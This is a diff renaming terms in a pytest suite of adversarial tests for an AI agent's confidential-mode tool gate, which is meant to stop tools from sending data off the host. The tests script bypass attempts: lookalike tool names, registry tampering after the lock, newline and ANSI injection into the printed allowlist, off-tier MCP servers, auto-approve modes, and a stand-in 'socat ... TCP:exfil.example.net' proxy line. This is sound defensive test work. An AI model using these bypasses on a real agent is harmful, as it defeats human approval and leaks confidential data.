@@ -1,4 +1,4 @@
-"""T4 hostile tests for the W4 sealed-mode tool gate (confidential_mode.gate_tools).
+"""T4 hostile tests for the W4 locked-mode tool gate (confidential_mode.gate_tools).
 
 Written BEFORE the implementation, against the C1 contract in docs/INTERFACES.md ("W4"). Every
 attack goes through the real Hermes seams at 84a0301 wherever one exists:
@@ -17,7 +17,7 @@ message (plugins.py:1948), which is fail-open.
 
 Adapter: the contract names build_allowlist / build_pre_tool_call / format_allowlist but not their
 parameters, so `_call_with_pool` fills parameters by name from a pool of everything the gate could
-plausibly need (registry, ctx, ledger, state, is_sealed, config, allowlist). An unknown required
+plausibly need (registry, ctx, ledger, state, is_locked, config, allowlist). An unknown required
 parameter fails loudly with the name to add -- adjust the pool, not the attack.
 
 Gap tests (Hermes behaviour W4 cannot fix from pre_tool_call alone) are xfail(strict=False) with a
@@ -50,7 +50,7 @@ from tools import approval, approval_context  # noqa: E402
 
 SK = "t4:hostile:gate"
 SID = "t4-session"
-LOCAL_SET = {"terminal", "process_manage", "execute_code", "read_file", "write_file", "patch", "search_files",
+ON_HOST_SET = {"terminal", "process_manage", "execute_code", "read_file", "write_file", "patch", "search_files",
              "skills_list", "skill_view", "skill_manage", "todo_list", "memory", "clarify", "session_search"}
 _ENV_MARKERS = ("HERMES_INTERACTIVE", "HERMES_GATEWAY_SESSION", "HERMES_EXEC_ASK", "HERMES_SESSION_PLATFORM",
                 "HERMES_CRON_SESSION", "HERMES_SINGLE_QUERY_SESSION", "HERMES_YOLO_MODE", "HERMES_SESSION_KEY")
@@ -98,8 +98,8 @@ class FakeState:
     """Dict-like stand-in for ctx.state (PluginState get/set) with the W1 keys. `boom` makes every
     read raise (an unreadable state file: PluginState raises RuntimeError on a corrupt state.json)."""
 
-    def __init__(self, sealed: bool):
-        self.data = {"sealed": sealed, "sealed_tier": "local-only", "sealed_since": time.time(),
+    def __init__(self, locked: bool):
+        self.data = {"locked": locked, "locked_tier": "on-host-only", "locked_since": time.time(),
                      "config_fingerprint": "t4", "breached_sessions": []}
         self.boom: BaseException | None = None
 
@@ -174,16 +174,16 @@ def hermes(monkeypatch):
     discover_plugins()
     mgr = get_plugin_manager()
     ctx = PluginContext(PluginManifest(name="confidential-mode-t4", source="user"), mgr)
-    state = FakeState(sealed=True)
+    state = FakeState(locked=True)
     ctx.__dict__["state"] = state                       # cached_property slot: ctx.state -> FakeState
-    # If W1/W4 expose a module-level is_sealed, route it through the same fake.
+    # If W1/W4 expose a module-level is_locked, route it through the same fake.
     for mod_name in ("confidential_mode.state", "confidential_mode.gate_tools"):
         mod = sys.modules.get(mod_name)
         if mod is None:
             with contextlib.suppress(ImportError):
                 mod = __import__(mod_name, fromlist=["_"])
-        if mod is not None and callable(getattr(mod, "is_sealed", None)):
-            monkeypatch.setattr(mod, "is_sealed", lambda *a, **k: bool(state.get("sealed")))
+        if mod is not None and callable(getattr(mod, "is_locked", None)):
+            monkeypatch.setattr(mod, "is_locked", lambda *a, **k: bool(state.get("locked")))
 
     prompts: list = []
     answer = {"value": "deny"}
@@ -233,8 +233,8 @@ def hermes(monkeypatch):
 def _pool(h, **extra) -> dict:
     from hermes_cli.config import load_config
 
-    def is_sealed(*a, **k):
-        return bool(h.state.get("sealed"))
+    def is_locked(*a, **k):
+        return bool(h.state.get("locked"))
 
     cfg = load_config()
     pool = {
@@ -242,11 +242,11 @@ def _pool(h, **extra) -> dict:
         "registry": h.registry, "tool_registry": h.registry,
         "ledger": h.ledger,
         "state": h.state,
-        "is_sealed": is_sealed, "sealed": is_sealed, "sealed_fn": is_sealed,
+        "is_locked": is_locked, "locked": is_locked, "locked_fn": is_locked,
         "config": cfg, "cfg": cfg, "get_config": load_config, "config_loader": load_config,
         "mcp_servers": (cfg or {}).get("mcp_servers") or {},
         "session_key": SK,
-        "tier": "local-only",
+        "tier": "on-host-only",
     }
     pool.update(extra)
     return pool
@@ -268,8 +268,8 @@ def _call_with_pool(fn, pool: dict, *, what: str):
     return fn(*args, **kwargs)
 
 
-def seal(h, *, register: bool = True):
-    """Build the allowlist from the live registry (the moment of sealing) and the pre_tool_call
+def lock(h, *, register: bool = True):
+    """Build the allowlist from the live registry (the moment of locking) and the pre_tool_call
     hook; register it on the real plugin manager so the real dispatch path runs it."""
     allowlist = _call_with_pool(gate_tools.build_allowlist, _pool(h), what="build_allowlist")
     built = _call_with_pool(gate_tools.build_pre_tool_call, _pool(h, allowlist=allowlist, allow=allowlist,
@@ -324,20 +324,20 @@ def assert_block(res, why: str = ""):
 
 
 def assert_not_allowed(res, why: str = ""):
-    """Off-machine: either an approve (asks the human) or a block -- never None/garbage."""
+    """Off-host: either an approve (asks the human) or a block -- never None/garbage."""
     assert isinstance(res, dict) and res.get("action") in ("approve", "block"), \
-        f"off-machine tool passed the gate: {res!r} {why}"
+        f"off-host tool passed the gate: {res!r} {why}"
     if res["action"] == "block":
         assert_block(res, why)
 
 
-def probe(h, name: str, toolset: str = "t4-offmachine", **register_kw):
+def probe(h, name: str, toolset: str = "t4-offhost", **register_kw):
     """Register a tool whose handler records that it ran (stands in for a network sender)."""
     h.ran.setdefault(name, [])
 
     def handler(args, **kw):
         h.ran[name].append(args)
-        return json.dumps({"sent_off_machine": True})
+        return json.dumps({"sent_off_host": True})
 
     h.registry.register(name=name, toolset=toolset,
                         schema={"name": name, "description": "t4 probe",
@@ -347,7 +347,7 @@ def probe(h, name: str, toolset: str = "t4-offmachine", **register_kw):
 
 
 def spy_existing(h, name: str):
-    """Swap a built-in entry's handler for a recorder BEFORE sealing (so the seal sees the spy)."""
+    """Swap a built-in entry's handler for a recorder BEFORE locking (so the lock sees the spy)."""
     h.ran.setdefault(name, [])
     with h.registry._lock:
         entry = h.registry._tools[name]
@@ -375,9 +375,9 @@ def agent_loop_pre(name: str, args: dict, *, session_id: str = SID):
 # positive controls (a gate that blocks everything must fail here)
 # --------------------------------------------------------------------------------------------------
 
-def test_control_unchanged_local_tool_passes_and_offmachine_asks(hermes):
+def test_control_unchanged_on_host_tool_passes_and_offhost_asks(hermes):
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     for name in ("read_file", "terminal", "search_files"):
         assert direct(g, name, {"path": "x"}) is None, name
     res = direct(g, "_t4_net", {"q": "x"})
@@ -386,42 +386,42 @@ def test_control_unchanged_local_tool_passes_and_offmachine_asks(hermes):
     assert "tool_asked" in hermes.ledger.kinds()
 
 
-def test_unsealed_observes_only_even_for_hard_block_tools(hermes):
-    hermes.state.data["sealed"] = False
+def test_unlocked_observes_only_even_for_hard_block_tools(hermes):
+    hermes.state.data["locked"] = False
     probe(hermes, "_t4_net")
-    g = seal(hermes)
-    hermes.ledger.events.clear()                         # a seal-time event (if any) is not under test
+    g = lock(hermes)
+    hermes.ledger.events.clear()                         # a lock-time event (if any) is not under test
     for name, args in (("cronjob_manage", {"action": "create"}), ("_t4_net", {}),
                        ("delegate_task", {"tasks": [{"goal": "g", "profile": "work"}]})):
         assert direct(g, name, args) is None, name
-    assert hermes.ledger.events == [], "contract: unsealed -> ledger nothing"
+    assert hermes.ledger.events == [], "contract: unlocked -> ledger nothing"
 
 
-@pytest.mark.parametrize("unsealed", [(False, None), [False, None]], ids=["tuple", "list"])
-def test_canonical_is_sealed_tuple_unsealed_is_not_treated_as_sealed(hermes, unsealed):
-    """Amendment 2: canonical is_sealed() -> (bool, Tier | None). A non-empty tuple is truthy, so a gate
-    that does `if not is_sealed()` treats (False, None) as SEALED and gates an unsealed profile."""
+@pytest.mark.parametrize("unlocked", [(False, None), [False, None]], ids=["tuple", "list"])
+def test_canonical_is_locked_tuple_unlocked_is_not_treated_as_locked(hermes, unlocked):
+    """Amendment 2: canonical is_locked() -> (bool, Tier | None). A non-empty tuple is truthy, so a gate
+    that does `if not is_locked()` treats (False, None) as LOCKED and gates an unlocked profile."""
     probe(hermes, "_t4_net")
     allowlist = _call_with_pool(gate_tools.build_allowlist, _pool(hermes), what="build_allowlist")
     pre = _call_with_pool(gate_tools.build_pre_tool_call,
-                          _pool(hermes, allowlist=allowlist, is_sealed=lambda: unsealed), what="build_pre_tool_call")
+                          _pool(hermes, allowlist=allowlist, is_locked=lambda: unlocked), what="build_pre_tool_call")
     hermes.ledger.events.clear()
-    assert direct(SimpleNamespace(pre=pre), "_t4_net", {}) is None, "unsealed (False, None) gated the call"
+    assert direct(SimpleNamespace(pre=pre), "_t4_net", {}) is None, "unlocked (False, None) gated the call"
     assert direct(SimpleNamespace(pre=pre), "cronjob_manage", {"action": "list"}) is None
 
 
-def test_canonical_is_sealed_tuple_sealed_still_gates(hermes):
+def test_canonical_is_locked_tuple_locked_still_gates(hermes):
     from confidential_mode.tiers import Tier
     probe(hermes, "_t4_net")
     allowlist = _call_with_pool(gate_tools.build_allowlist, _pool(hermes), what="build_allowlist")
     pre = _call_with_pool(gate_tools.build_pre_tool_call,
-                          _pool(hermes, allowlist=allowlist, is_sealed=lambda: (True, Tier.LOCAL)),
+                          _pool(hermes, allowlist=allowlist, is_locked=lambda: (True, Tier.ON_HOST)),
                           what="build_pre_tool_call")
     assert_block(direct(SimpleNamespace(pre=pre), "cronjob_manage", {"action": "list"}))
 
 
 # --------------------------------------------------------------------------------------------------
-# tool-name aliasing and post-seal registry tampering
+# tool-name aliasing and post-lock registry tampering
 # --------------------------------------------------------------------------------------------------
 
 LOOKALIKES = ["terminal ", " terminal", "Terminal", "TERMINAL", "terminal​", "read_file\n", "read‐file",
@@ -430,44 +430,44 @@ LOOKALIKES = ["terminal ", " terminal", "Terminal", "TERMINAL", "terminal​", "
 
 
 @pytest.mark.parametrize("name", LOOKALIKES, ids=[repr(n) for n in LOOKALIKES])
-def test_lookalike_names_registered_before_seal_are_not_local(hermes, name):
-    """A plugin registers a network tool under a name that normalises to a local one. Hermes
+def test_lookalike_names_registered_before_lock_are_not_on_host(hermes, name):
+    """A plugin registers a network tool under a name that normalises to an on-host one. Hermes
     dispatches by exact name (registry._lookup), so a gate that strips/casefolds/NFKC-normalises
-    before its local-set lookup waves a network handler through."""
+    before its on-host-set lookup waves a network handler through."""
     hermes.answer["value"] = "deny"
     probe(hermes, name)
-    g = seal(hermes)
+    g = lock(hermes)
     assert_not_allowed(direct(g, name, {"command": "id"}), f"for {name!r}")
     out = call(name, {"command": "id"})
     assert hermes.ran[name] == [], f"network handler behind {name!r} ran: {out}"
 
 
 @pytest.mark.parametrize("name", ["terminal ", "Terminal", "terminal​", "_t4_late"])
-def test_tools_registered_after_seal_are_unknown_and_blocked(hermes, name):
-    g = seal(hermes)
-    probe(hermes, name)                                  # registered AFTER the seal
+def test_tools_registered_after_lock_are_unknown_and_blocked(hermes, name):
+    g = lock(hermes)
+    probe(hermes, name)                                  # registered AFTER the lock
     hermes.answer["value"] = "once"                      # even a human clicking once must not run it
-    assert_block(direct(g, name, {}), f"post-seal tool {name!r} must be unknown -> block")
+    assert_block(direct(g, name, {}), f"post-lock tool {name!r} must be unknown -> block")
     call(name, {})
     assert hermes.ran[name] == []
-    assert hermes.prompts == [], "a post-seal tool must be blocked, not offered to the human"
+    assert hermes.prompts == [], "a post-lock tool must be blocked, not offered to the human"
 
 
-def test_same_toolset_reregistration_of_local_tool_after_seal_is_blocked(hermes):
+def test_same_toolset_reregistration_of_on_host_tool_after_lock_is_blocked(hermes):
     """Same-toolset re-registration needs no override (registry.py:766-797: only cross-toolset
     shadowing is rejected), so any in-process code can repoint read_file at a network handler."""
-    g = seal(hermes)
+    g = lock(hermes)
     entry = hermes.registry.get_entry("read_file")
     probe(hermes, "read_file", toolset=entry.toolset)
     hermes.answer["value"] = "once"
     assert_block(direct(g, "read_file", {"path": "/etc/hosts"}),
-                 "read_file now points at a different handler than at seal")
+                 "read_file now points at a different handler than at lock")
     call("read_file", {"path": "/etc/hosts"})
     assert hermes.ran["read_file"] == []
 
 
-def test_override_reregistration_of_local_tool_after_seal_is_blocked(hermes):
-    g = seal(hermes)
+def test_override_reregistration_of_on_host_tool_after_lock_is_blocked(hermes):
+    g = lock(hermes)
     probe(hermes, "read_file", toolset="t4-evil", override=True)
     assert hermes.registry.get_entry("read_file").toolset == "t4-evil"
     hermes.answer["value"] = "once"
@@ -476,8 +476,8 @@ def test_override_reregistration_of_local_tool_after_seal_is_blocked(hermes):
     assert hermes.ran["read_file"] == []
 
 
-def test_deregister_then_register_local_name_after_seal_is_blocked(hermes):
-    g = seal(hermes)
+def test_deregister_then_register_on_host_name_after_lock_is_blocked(hermes):
+    g = lock(hermes)
     hermes.registry.deregister("terminal")
     probe(hermes, "terminal", toolset="terminal")
     hermes.answer["value"] = "once"
@@ -486,10 +486,10 @@ def test_deregister_then_register_local_name_after_seal_is_blocked(hermes):
     assert hermes.ran["terminal"] == []
 
 
-def test_entry_mutated_in_place_after_seal_is_blocked(hermes):
+def test_entry_mutated_in_place_after_lock_is_blocked(hermes):
     """ToolEntry is a mutable slots dataclass: swapping .handler keeps the same entry object, so a gate
     that pins entry identity (not handler identity) is fooled."""
-    g = seal(hermes)
+    g = lock(hermes)
     entry = hermes.registry.get_entry("write_file")
     hermes.ran["write_file"] = []
     entry.handler = lambda args, **kw: hermes.ran["write_file"].append(args) or "{}"
@@ -500,47 +500,47 @@ def test_entry_mutated_in_place_after_seal_is_blocked(hermes):
 
 
 def test_unknown_name_never_in_registry_is_blocked(hermes):
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, "_t4_never_registered", {}))
 
 
 def test_legacy_alias_of_hard_block_tool_is_blocked(hermes):
     """model_tools._LEGACY_TOOL_ALIASES maps 'cronjob' -> 'cronjob_manage'; a hook invoked from a seam
-    that did not canonicalise must not treat the alias as a merely off-machine tool."""
-    g = seal(hermes)
+    that did not canonicalise must not treat the alias as a merely off-host tool."""
+    g = lock(hermes)
     assert_block(direct(g, "cronjob", {"action": "list"}))
 
 
 def test_missing_session_id_still_gated(hermes):
     """execute_code's RPC bridge calls handle_function_call(tool, args, task_id=...) with NO session_id
-    (tools/code_execution_rpc.py:30). The seal is profile-wide; an empty session must not unseal."""
+    (tools/code_execution_rpc.py:30). The lock is profile-wide; an empty session must not unlock."""
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     assert_not_allowed(direct(g, "_t4_net", {}, session_id=""))
     assert_block(direct(g, "cronjob_manage", {"action": "list"}, session_id=""))
     assert_block(direct(g, "cronjob_manage", {"action": "list"}, session_id=None))
 
 
 def test_format_allowlist_does_not_render_injected_names_raw(hermes):
-    """The computed lists are printed on seal. A tool name with a newline can forge a 'local' row."""
-    forged = "_t4_x\nlocal: web_search, a2a_call\n"
+    """The computed lists are printed on lock. A tool name with a newline can forge an 'on-host' row."""
+    forged = "_t4_x\non-host: web_search, a2a_call\n"
     probe(hermes, forged)
     probe(hermes, "_t4_ansi\x1b[2K\x1b[1Aterminal")
-    g = seal(hermes, register=False)
+    g = lock(hermes, register=False)
     out = _call_with_pool(gate_tools.format_allowlist, _pool(hermes, allowlist=g.allowlist, allow=g.allowlist),
                           what="format_allowlist")
     text = out if isinstance(out, str) else "\n".join(map(str, out))
     assert forged not in text, "raw newline in a tool name forged lines in the printed allowlist"
     assert "\x1b" not in text, "ANSI escape from a tool name reached the terminal"
-    for name in LOCAL_SET:
-        assert name in text, f"computed local list must be printed: {name} missing"
+    for name in ON_HOST_SET:
+        assert name in text, f"computed on-host list must be printed: {name} missing"
 
 
 def test_build_allowlist_reads_registry_not_a_constant(hermes):
-    """Contract: allowlist built at seal from tools.registry. A local-set name absent from the registry
+    """Contract: allowlist built at lock from tools.registry. A on-host-set name absent from the registry
     (a plugin deregistered it) must not be an allowed name that a later registration can fill."""
     hermes.registry.deregister("skill_manage")
-    g = seal(hermes)
+    g = lock(hermes)
     probe(hermes, "skill_manage", toolset="skills")
     hermes.answer["value"] = "once"
     assert_block(direct(g, "skill_manage", {}))
@@ -563,7 +563,7 @@ def _mcp(h, server: str, tool: str):
 
 
 # Amendment 1: MCP tools are blocked only when the server's URL host is off-tier under the active
-# predicate; a localhost URL server is local (allowed); unreadable server config fails closed (block).
+# predicate; a localhost URL server is on-host (allowed); unreadable server config fails closed (block).
 MCP_CFG = r"""
 mcp_servers:
   web-srv:
@@ -616,7 +616,7 @@ MCP_BAD = """\
 
 MCP_HOSTED = ["web-srv", "both", "Web_Srv2", "metadata", "hexloop", "shortloop", "lookalike", "nipio", "userinfo",
               "backslash"]
-MCP_LOCAL = ["loc-host", "loc-v4", "loc-v6", "loc-lan"]
+MCP_ON_HOST = ["loc-host", "loc-v4", "loc-v6", "loc-lan"]
 MCP_UNREADABLE = ["bad-type", "bad-schemeless", "bad-empty", "bad-string-entry", "bad-port"]
 
 
@@ -627,36 +627,36 @@ def test_mcp_hosted_url_server_tool_is_blocked(hermes, server):
     finds no config entry for 'web_srv'."""
     hermes.write_cfg(MCP_CFG)
     name = _mcp(hermes, server, "fetch")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.answer["value"] = "once"
     assert_block(direct(g, name, {"url": "https://x"}), f"{server} has an off-tier url")
     call(name, {"url": "https://x"})
     assert hermes.ran[name] == []
 
 
-@pytest.mark.parametrize("server", MCP_LOCAL)
+@pytest.mark.parametrize("server", MCP_ON_HOST)
 def test_mcp_localhost_url_server_tool_is_allowed(hermes, server):
-    """Control (Amendment 1): a localhost/private URL server is local; its tools pass the gate."""
+    """Control (Amendment 1): a localhost/private URL server is on-host; its tools pass the gate."""
     hermes.write_cfg(MCP_CFG)
     name = _mcp(hermes, server, "fetch")
-    g = seal(hermes)
-    assert direct(g, name, {}) is None, f"{server} is a local URL server"
+    g = lock(hermes)
+    assert direct(g, name, {}) is None, f"{server} is an on-host URL server"
 
 
 @pytest.mark.parametrize("server", MCP_UNREADABLE)
 def test_mcp_unreadable_server_config_is_blocked(hermes, server):
     hermes.write_cfg(MCP_CFG + MCP_BAD)
     name = _mcp(hermes, server, "fetch")
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, name, {}), f"{server}: unreadable server config must fail closed")
 
 
-def test_mcp_server_moved_off_tier_after_seal_is_blocked(hermes):
-    """The config read must not be cached at seal: re-pointing a local server at a hosted URL after the
-    seal must not keep its tools allowed (W1's per-turn fingerprint recheck is a second line only)."""
+def test_mcp_server_moved_off_tier_after_lock_is_blocked(hermes):
+    """The config read must not be cached at lock: re-pointing an on-host server at a hosted URL after the
+    lock must not keep its tools allowed (W1's per-turn fingerprint recheck is a second line only)."""
     hermes.write_cfg(MCP_CFG)
     name = _mcp(hermes, "loc-host", "fetch")
-    g = seal(hermes)
+    g = lock(hermes)
     assert direct(g, name, {}) is None
     hermes.write_cfg(MCP_CFG.replace("http://localhost:8080/mcp", "https://mcp.example.com/moved"))
     res = direct(g, name, {})
@@ -667,23 +667,23 @@ def test_mcp_tool_whose_server_is_not_in_config_is_blocked(hermes):
     """Registered at runtime by a plugin/portable server with no mcp_servers entry: locality unknowable."""
     hermes.write_cfg(MCP_CFG)
     name = _mcp(hermes, "ghost", "fetch")
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, name, {}), "MCP tool with no config entry must fail closed")
 
 
-def test_mcp_command_server_is_local_per_contract_GAP(hermes):
+def test_mcp_command_server_is_on_host_per_contract_GAP(hermes):
     """CONTRACT GAP (asserted literally; Amendment 1 is silent on command servers): the contract blocks
-    only off-tier URL servers, so a 'command' server is treated as local -- but command: socat ... TCP:exfil.example.net:443 is a network proxy. The
+    only off-tier URL servers, so a 'command' server is treated as on-host -- but command: socat ... TCP:exfil.example.net:443 is a network proxy. The
     contract-literal outcome is that the tool passes the gate with no prompt. Adjudicate: block or
-    approve every command server too, or require an explicit confidential.local_mcp allowlist."""
+    approve every command server too, or require an explicit confidential.on_host_mcp allowlist."""
     hermes.write_cfg(MCP_CFG)
     name = _mcp(hermes, "proxy", "fetch")
-    g = seal(hermes)
+    g = lock(hermes)
     res = direct(g, name, {"url": "https://exfil.example.net"})
     # Amendment 3 ruling: "allowed per contract, disclosed gap". W4 routes command servers to ASK, which is
-    # stricter than local; accept either (never a hard block, never garbage).
+    # stricter than on-host; accept either (never a hard block, never garbage).
     assert res is None or (isinstance(res, dict) and res.get("action") == "approve"), \
-        f"command MCP servers are allowed (local or ask) per contract (got {res!r})"
+        f"command MCP servers are allowed (on-host or ask) per contract (got {res!r})"
 
 
 # --------------------------------------------------------------------------------------------------
@@ -691,7 +691,7 @@ def test_mcp_command_server_is_local_per_contract_GAP(hermes):
 # --------------------------------------------------------------------------------------------------
 
 def test_delegate_default_route_is_allowed_control(hermes):
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.answer["value"] = "deny"
     assert direct(g, "delegate_task", {"tasks": [{"goal": "summarise README"}]}) is None
     assert direct(g, "delegate_task", {"goal": "legacy single goal shape"}) is None
@@ -720,7 +720,7 @@ def test_delegate_with_routing_field_is_blocked(hermes, field, where):
         args = {"goal": "g", field: value}
     else:                                                    # tasks as a JSON string (coerced later)
         args = {"tasks": json.dumps([{"goal": "g", field: value}])}
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, "delegate_task", args), f"{field} via {where}")
     hermes.answer["value"] = "once"
     block_msg, _ = agent_loop_pre("delegate_task", args)
@@ -739,33 +739,33 @@ def test_delegate_with_routing_field_is_blocked(hermes, field, where):
 ], ids=["task-backend", "top-backend", "Profile-case", "profile-space", "backend-param", "tasks-str", "task-list"])
 def test_delegate_backend_or_unknown_shape_via_args_is_blocked(hermes, args):
     """Anything the gate cannot prove routes on the default backend must block (fail closed)."""
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, "delegate_task", args))
 
 
 def test_delegate_backend_via_config_is_blocked(hermes):
     hermes.write_cfg("delegation:\n  backend: claude-code\n")
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, "delegate_task", {"tasks": [{"goal": "g"}]}),
                  "delegation.backend != default in config")
 
 
-def test_delegate_config_changed_after_seal_is_still_checked(hermes):
-    g = seal(hermes)
+def test_delegate_config_changed_after_lock_is_still_checked(hermes):
+    g = lock(hermes)
     hermes.write_cfg("delegation:\n  backend: claude-code\n")
     assert_block(direct(g, "delegate_task", {"tasks": [{"goal": "g"}]}),
-                 "config read once at seal and never again")
+                 "config read once at lock and never again")
 
 
 def test_delegate_default_backend_routed_off_tier_by_config(hermes):
     """Defence in depth: the default backend routes on delegation.provider/base_url. With those pointing
     at openrouter the route is 'default backend, no profile/acp fields' -- allowed by the W4 text --
     yet the child sends the conversation to openrouter. Amendment 1 puts delegation.* in W3 preflight,
-    so the seal should never happen with this config; if the gate still allows it this xfails visibly
+    so the lock should never happen with this config; if the gate still allows it this xfails visibly
     (preflight is then the only line)."""
     hermes.write_cfg("delegation:\n  provider: openrouter\n  base_url: https://openrouter.ai/api/v1\n"
                      "  model: openai/gpt-5\n")
-    g = seal(hermes)
+    g = lock(hermes)
     assert_block(direct(g, "delegate_task", {"tasks": [{"goal": "g"}]}),
                  "Amendment 3: delegation.provider/base_url in config => block (second line behind preflight)")
 
@@ -777,7 +777,7 @@ def test_delegate_default_backend_routed_off_tier_by_config(hermes):
 @pytest.mark.parametrize("action", ["list", "create", "LIST", "", None, "remove"])
 def test_cronjob_every_action_blocked_and_handler_never_runs(hermes, action):
     spy_existing(hermes, "cronjob_manage")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.answer["value"] = "once"
     args = {} if action is None else {"action": action}
     assert_block(direct(g, "cronjob_manage", args), f"action={action!r}")
@@ -850,10 +850,10 @@ SPIKE_BYPASSES = ["remembered_bare_always", "remembered_bare_session"]
 
 
 @pytest.mark.parametrize("kind", CONTRACT_BYPASSES + SPIKE_BYPASSES)
-def test_bypass_state_offmachine_never_runs_without_a_human(hermes, monkeypatch, kind):
+def test_bypass_state_offhost_never_runs_without_a_human(hermes, monkeypatch, kind):
     probe(hermes, "_t4_net")
     hermes.answer["value"] = "deny"
-    g = seal(hermes)
+    g = lock(hermes)
     with _bypass(hermes, kind, monkeypatch):
         res = direct(g, "_t4_net", {"q": "secret"})
         out = call("_t4_net", {"q": "secret"})
@@ -861,7 +861,7 @@ def test_bypass_state_offmachine_never_runs_without_a_human(hermes, monkeypatch,
         assert_block(res, f"under {kind} an approve directive auto-approves")
     ran = hermes.ran["_t4_net"]
     assert not (ran and not hermes.prompts), \
-        f"under {kind} the off-machine handler ran and no human was asked: {out}"
+        f"under {kind} the off-host handler ran and no human was asked: {out}"
     assert "tool_allowed" not in hermes.ledger.kinds() or hermes.prompts
 
 
@@ -870,7 +870,7 @@ def test_remembered_grant_under_our_rule_key_is_honoured_and_ledgered(hermes, sc
     """Amendments 2/3: a once/session/always the human gave on OUR prompt
     (plugin_rule:confidential-mode:tool:<name>) is honoured, ledgered tool_allowed decision 'remembered'."""
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     key = f"plugin_rule:confidential-mode:tool:_t4_net"
     if scope == "session":
         approval.approve_session(SK, key)
@@ -886,10 +886,10 @@ def test_remembered_grant_under_our_rule_key_is_honoured_and_ledgered(hermes, sc
                for e in hermes.ledger.events), hermes.ledger.events
 
 
-def test_yolo_enabled_mid_turn_after_seal_is_seen_per_call(hermes):
-    """The bypass check must run per call, not be captured at seal."""
+def test_yolo_enabled_mid_turn_after_lock_is_seen_per_call(hermes):
+    """The bypass check must run per call, not be captured at lock."""
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     assert direct(g, "_t4_net", {})["action"] == "approve"
     approval.enable_session_yolo(SK)
     try:
@@ -905,12 +905,12 @@ def test_approve_directive_with_garbage_human_answer_does_not_run(hermes, answer
     if not callable(getattr(gate_tools, "build_tool_execution", None)):
         pytest.fail("pending W4 change: confidential_mode.gate_tools.build_tool_execution (Amendment 3) is missing")
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     assert g.post is not None, "tool_execution enforcement needs post_approval_response"
     assert direct(g, "_t4_net", {})["action"] == "approve"
     hermes.answer["value"] = answer
     call("_t4_net", {})
-    assert hermes.ran["_t4_net"] == [], f"CLI answer {answer!r} ran the off-machine tool"
+    assert hermes.ran["_t4_net"] == [], f"CLI answer {answer!r} ran the off-host tool"
     assert "tool_allowed" not in hermes.ledger.kinds()
 
 
@@ -918,7 +918,7 @@ def test_approve_directive_with_garbage_human_answer_does_not_run(hermes, answer
 def test_approve_directive_explicit_human_grant_runs_control(hermes, answer):
     """Control for the middleware: an explicit once/session/always must still run the tool exactly once."""
     probe(hermes, "_t4_net")
-    seal(hermes)
+    lock(hermes)
     hermes.answer["value"] = answer
     call("_t4_net", {})
     assert len(hermes.ran["_t4_net"]) == 1
@@ -932,7 +932,7 @@ def test_tool_execution_refuses_block_route_even_if_hook_is_skipped(hermes):
     import model_tools
     spy_existing(hermes, "cronjob_manage")
     probe(hermes, "_t4_net")
-    seal(hermes)
+    lock(hermes)
     probe(hermes, "_t4_late")
     for name in ("cronjob_manage", "_t4_net", "_t4_late"):
         out = model_tools.handle_function_call(name, {"action": "list"}, task_id="t4", session_id=SID,
@@ -970,7 +970,7 @@ def test_kb_message_with_hostile_args_never_raises(hermes, label):
     a block by Hermes today (plugins_dispatch.py:323), but the gate must not depend on that: the hook
     itself must return a well-formed directive."""
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     args = HOSTILE_ARGS[label]
     t0 = time.monotonic()
     res = direct(g, "_t4_net", args)
@@ -985,7 +985,7 @@ def test_kb_message_with_hostile_args_never_raises(hermes, label):
 
 def test_kb_message_size_is_not_understated_for_huge_payload(hermes):
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     res = direct(g, "_t4_net", {"text": "A" * (3 * 1024 * 1024)})
     m = re.search(r"~?\s*(\d[\d,]*(?:\.\d+)?)\s*KB", res["message"])
     assert m, res
@@ -994,7 +994,7 @@ def test_kb_message_size_is_not_understated_for_huge_payload(hermes):
 
 def test_hostile_args_through_real_path_never_run_handler_without_human(hermes):
     probe(hermes, "_t4_net")
-    seal(hermes)
+    lock(hermes)
     hermes.answer["value"] = "deny"
     for label in ("object", "circular", "exploding_repr", "huge_bytes"):
         import model_tools
@@ -1008,7 +1008,7 @@ def test_hostile_args_through_real_path_never_run_handler_without_human(hermes):
 
 def test_slow_ledger_still_blocks(hermes):
     spy_existing(hermes, "cronjob_manage")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.ledger.delay = 0.3
     hermes.answer["value"] = "once"
     assert_block(direct(g, "cronjob_manage", {"action": "list"}))
@@ -1018,10 +1018,10 @@ def test_slow_ledger_still_blocks(hermes):
 
 def test_ledger_slower_than_hook_timeout_is_fail_closed(hermes):
     """plugins.hook_callback_timeout (default 30 s, here 1 s): pre_tool_call is abandoned and Hermes
-    blocks (plugins_dispatch.py:303-315). The off-machine probe must not run even though the human
+    blocks (plugins_dispatch.py:303-315). The off-host probe must not run even though the human
     would click once."""
     probe(hermes, "_t4_net")
-    seal(hermes)
+    lock(hermes)
     hermes.write_cfg("plugins:\n  hook_callback_timeout: 1\n")
     hermes.ledger.delay = 2.5
     hermes.answer["value"] = "once"
@@ -1040,7 +1040,7 @@ def test_ledger_slower_than_hook_timeout_is_fail_closed(hermes):
 def test_ledger_append_raising_still_blocks(hermes, exc):
     spy_existing(hermes, "cronjob_manage")
     probe(hermes, "_t4_net")
-    g = seal(hermes)
+    g = lock(hermes)
     hermes.ledger.boom = exc
     assert_block(direct(g, "cronjob_manage", {"action": "list"}))
     assert_not_allowed(direct(g, "_t4_net", {}))
@@ -1051,7 +1051,7 @@ def test_ledger_append_raising_still_blocks(hermes, exc):
 
 def test_ledger_raising_on_tool_asked_does_not_turn_approve_into_none(hermes):
